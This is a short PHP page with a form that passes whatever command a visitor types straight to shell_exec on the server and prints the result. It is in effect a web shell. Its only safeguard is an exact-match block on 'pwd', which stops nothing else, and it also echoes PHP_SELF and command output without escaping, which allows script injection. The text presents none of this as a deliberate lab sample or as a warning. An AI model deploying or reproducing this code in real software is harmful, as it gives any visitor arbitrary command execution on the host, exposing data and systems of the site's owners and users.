
<!DOCTYPE html>
<html>
<head>
    <title>Run Command</title>
</head>
<body>
    <h1>Run Command</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
        <label for="command">Enter a command:</label>
        <input type="text" id="command" name="command" required><br>
        <input type="submit" name="run" value="Run Command">
    </form>

    <?php
    if (isset($_POST['run'])) {
        // Get the user-entered command
        $command = $_POST['command'];

        // Check if the command is "pwd" and disallow it
        if ($command === 'pwd') {
            echo "Command 'pwd' is not allowed.";
        } else {
            // Execute the command using shell_exec
            $output = shell_exec($command);
            // Display the output
            echo "<pre>$output</pre>";
        }
    }
    ?>
</body>
</html>
